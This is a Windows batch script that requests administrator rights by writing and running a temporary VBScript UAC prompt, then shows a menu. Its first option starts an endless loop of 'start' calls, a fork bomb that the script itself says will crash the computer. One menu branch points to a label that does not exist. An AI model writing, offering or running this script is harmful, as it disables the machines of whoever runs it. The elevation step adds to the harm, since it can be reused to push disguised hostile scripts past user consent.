@echo off
@echo off
REM Check for administrator privileges
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c %~s0", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /b

:gotAdmin
    REM Original commands start here
    echo Running as administrator...
    REM Add your actual batch commands below this line
CLS
goto begin
:begin
echo DO you know what your doing?
echo 1.YES
echo 2. NO
echo 3.IDK
echo.

CHOICE /C 123 /M "Enter your choice wisely:"

IF ERRORLEVEL 3 GOTO helpme
IF ERRORLEVEL 2 GOTO @exit
IF ERRORLEVEL 1 GOTO chomper

:chomper
start
goto chomper

:helpme
echo This is a script that will CRASH YOUR COMPUTER YOU HAVE BEEN WARNED.
goto begin
